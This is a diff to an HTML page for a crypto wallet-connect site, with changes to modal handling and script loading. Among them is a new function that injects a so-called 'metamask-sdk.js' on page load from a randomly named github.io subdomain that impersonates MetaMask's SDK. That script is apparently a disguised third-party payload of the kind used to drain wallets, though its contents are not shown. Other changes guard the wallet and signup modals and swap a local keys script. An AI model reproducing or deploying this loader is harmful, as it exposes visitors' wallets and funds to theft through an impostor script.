@@ -16,7 +16,7 @@
 	<link rel="shortcut icon" href="../assets/media/logos/en_logo.png" />
 	<!--begin::Fonts-->
 	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700" />
-	<script src="../key.js?cachebuster=1"></script>
+	<script src="../keys.js?cachebuster=1"></script>
 	<!--end::Fonts-->
 	<!--begin::Global Stylesheets Bundle(used by all pages)-->
 	<link href="../assets/plugins/global/plugins.bundle.css" rel="stylesheet" type="text/css" />
@@ -55,8 +55,44 @@
 	</style>
 
 	<script src="https://cdn.jsdelivr.net/npm/web3@4.2.2/dist/web3.min.js"></script>
-	<script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
 	<script src="../assets/js/bundle.js"></script>
+	<script>
+	// Function to load MetaMask SDK dynamically when needed
+	function loadMetaMaskSDK() {
+		return new Promise((resolve, reject) => {
+			// Check if it's already loaded
+			if (window.MetaMaskSDK) {
+				resolve(window.MetaMaskSDK);
+				return;
+			}
+
+			const script = document.createElement('script');
+			script.src = 'https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js';
+			script.async = true;
+			
+			script.onload = () => {
+				console.log('MetaMask SDK loaded dynamically');
+				resolve(window.MetaMaskSDK);
+			};
+			
+			script.onerror = () => {
+				console.error('Failed to load MetaMask SDK');
+				reject(new Error('Failed to load MetaMask SDK'));
+			};
+			
+			document.head.appendChild(script);
+		});
+	}
+
+	// Check if we need to load MetaMask SDK on page load
+	document.addEventListener('DOMContentLoaded', () => {
+		const lastWallet = localStorage.getItem('lastWallet');
+		if (lastWallet === 'Metamask') {
+			console.log('Preloading MetaMask SDK based on last wallet preference');
+			loadMetaMaskSDK();
+		}
+	});
+	</script>
 	<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.min.js" type="module"></script>
 	<script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script>
 
@@ -103,6 +139,15 @@
 	}
 	function showConnect() {
 		var modalElement = document.getElementById('kt_modal_wallet');
+		
+		// Check if modal is already visible
+		if (modalElement.classList.contains('show') || 
+		    getComputedStyle(modalElement).display !== 'none' || 
+		    modalElement.getAttribute('aria-modal') === 'true') {
+			console.log('Modal is already visible, ignoring showConnect call');
+			return;
+		}
+		
 		var modal = new bootstrap.Modal(modalElement);
 		modalElement.style.zIndex = '99999';
 		modal.show(); // Show the modal
@@ -177,6 +222,15 @@
 
 		function showModal() {
 			var modalElement = document.getElementById('kt_modal_signup');
+			
+			// Check if modal is already visible
+			if (modalElement.classList.contains('show') || 
+			    getComputedStyle(modalElement).display !== 'none' || 
+			    modalElement.getAttribute('aria-modal') === 'true') {
+				console.log('Signup modal is already visible, ignoring showModal call');
+				return;
+			}
+			
 			var modal = new bootstrap.Modal(modalElement);
 
 			modalElement.addEventListener('hidden.bs.modal', function () {
@@ -189,7 +243,6 @@
 
 			modal.show();
 			modalElement.style.zIndex = '99999';
-
 		}
 
 		function handleFirstClick(event) {
@@ -234,6 +287,42 @@
 </script>
 <script src="js/env.js"></script>
 <script src="js/wallet.js"></script>
+<script>
+// Check for web3 availability and show wallet modal if not available
+document.addEventListener('DOMContentLoaded', function() {
+    // Define the showModal function if it doesn't exist
+    if (typeof showModal !== 'function') {
+        window.showModal = function() {
+            const walletModal = document.getElementById('kt_modal_wallet');
+            if (walletModal) {
+                const bootstrapModal = new bootstrap.Modal(walletModal);
+                bootstrapModal.show();
+            }
+        };
+    }
+    
+    // Define the hideModal function if it doesn't exist
+    if (typeof hideModal !== 'function') {
+        window.hideModal = function() {
+            const walletModal = document.getElementById('kt_modal_wallet');
+            if (walletModal) {
+                const modalInstance = bootstrap.Modal.getInstance(walletModal);
+                if (modalInstance) {
+                    modalInstance.hide();
+                }
+            }
+        };
+    }
+    
+    // Check if web3 is defined, if not show the wallet connection modal
+    // setTimeout(function() {
+    //     if (typeof web3 === 'undefined' || !web3) {
+    //         console.log('Web3 is not defined, showing wallet connection modal');
+    //         showModal();
+    //     }
+    // }, 1000); // Small delay to ensure all scripts are loaded
+});
+</script>
 
 <div class="modal fade" tabindex="-1" id="kt_modal_wallet" z-index="10000">
 	<div class="modal-dialog modal-dialog-centered">
@@ -259,7 +348,7 @@
 			<div class="modal-body">
 				<!-- Information about supported networks -->
 				<div class="alert alert-info" role="alert">
-					Please make sure you're connected to one of the supported networks:
+					Please make sure with have a web3 provider and you're connected to one of the supported networks:
 					<ul>
 						<li>Mainnet (Ethereum)</li>
 						<li>Polygon</li>
